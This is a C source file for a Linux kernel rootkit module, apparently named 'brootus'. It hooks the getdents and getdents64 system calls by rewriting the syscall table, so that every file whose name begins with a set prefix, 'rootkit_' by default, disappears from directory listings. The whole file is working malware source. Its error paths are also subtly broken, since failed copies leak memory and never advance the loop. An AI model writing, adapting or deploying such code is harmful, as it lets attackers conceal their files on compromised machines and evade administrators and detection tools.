#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>

#include "syscall.h"
#include "file_hiding.h"

#define STATE_FILES_VISIBLE 0
#define STATE_FILES_HIDDEN 1

// Function pointers to original syscalls
asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);

// Hidden state
int file_hiding_state = STATE_FILES_VISIBLE;

// Files with this prefix will be hidden
// TODO: Prefix over module parameters
char* file_hiding_prefix = NULL;

// Function that checks if needle is a prefix of haystack
int is_prefix(char* haystack, char* needle)
{
  char* haystack_ptr = haystack;
  char* needle_ptr = needle;

  if (needle == NULL) {
    return 0;
  }

  while (*needle_ptr != '\0') {
    if (*haystack_ptr == '\0' || *haystack_ptr != *needle_ptr) {
      return 0;
    }
    ++haystack_ptr;
    ++needle_ptr;
  }
  return 1;
}

// Our hooked getdents64 function
asmlinkage int brootus_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
  int ret;
  struct linux_dirent64* cur = dirp;
  int pos = 0;

  // Call the original function
  // Directory entries will be written to a buffer pointed to by dirp
  ret = original_getdents64 (fd, dirp, count); 

  // Iterate through the directory entries
  while (pos < ret) {

    // Check prefix
    if (is_prefix(cur->d_name, file_hiding_prefix)) {
      int err;
      int reclen = cur->d_reclen; // Size of current dirent
      char* next_rec = (char*)cur + reclen; // Address of next dirent
      int len = (int)dirp + ret - (int)next_rec; // Bytes from the next dirent to end of the last
      char* remaining_dirents = kmalloc(len, GFP_KERNEL);

      // Debug message
      //printk("Hiding file %s\n", cur->d_name);

      // Copy the next and following dirents to kernel memory
      err = copy_from_user(remaining_dirents, next_rec, len);
      if (err) {
        continue;
      }
      // Overwrite (delete) the current dirent in user memory
      err = copy_to_user(cur, remaining_dirents, len);
      if (err) {
        continue;
      }
      kfree(remaining_dirents);

      // Adjust the return value;
      ret -= reclen;
      continue;
    }

    // Get the next dirent
    pos += cur->d_reclen;
    cur = (struct linux_dirent64*) ((char*)dirp + pos);
  }
  return ret;
}

asmlinkage int brootus_getdents(unsigned int fd, struct linux_dirent*dirp, unsigned int count)
{
  // Analogous to 64 version
  int ret;
  struct linux_dirent* cur = dirp;
  int pos = 0;

  ret = original_getdents(fd, dirp, count); 
  while (pos < ret) {

    if (is_prefix(cur->d_name, file_hiding_prefix)) {
      int reclen = cur->d_reclen;
      char* next_rec = (char*)cur + reclen;
      int len = (int)dirp + ret - (int)next_rec;
      memmove(cur, next_rec, len);
      ret -= reclen;
      continue;
    }
    pos += cur->d_reclen;
    cur = (struct linux_dirent*) ((char*)dirp + pos);
  }
  return ret;
}

void set_file_prefix(char* prefix)
{
  kfree(file_hiding_prefix);
  file_hiding_prefix = kmalloc(strlen(prefix) + 1, GFP_KERNEL);
  strcpy(file_hiding_prefix, prefix);
}

void enable_file_hiding(void)
{
  if (file_hiding_state == STATE_FILES_HIDDEN) {
    return;
  }
  syscall_table_modify_begin();
  HOOK_SYSCALL(getdents);
  HOOK_SYSCALL(getdents64);
  syscall_table_modify_end();

  file_hiding_state = STATE_FILES_HIDDEN;
}

void disable_file_hiding(void)
{
  if (file_hiding_state == STATE_FILES_VISIBLE) {
    return;
  }
  syscall_table_modify_begin();
  RESTORE_SYSCALL(getdents);
  RESTORE_SYSCALL(getdents64);
  syscall_table_modify_end();

  file_hiding_state = STATE_FILES_VISIBLE;
}

void init_file_hiding(void)
{
  set_file_prefix("rootkit_");
  enable_file_hiding();
}

void finalize_file_hiding(void)
{
  disable_file_hiding();
  kfree(file_hiding_prefix);
}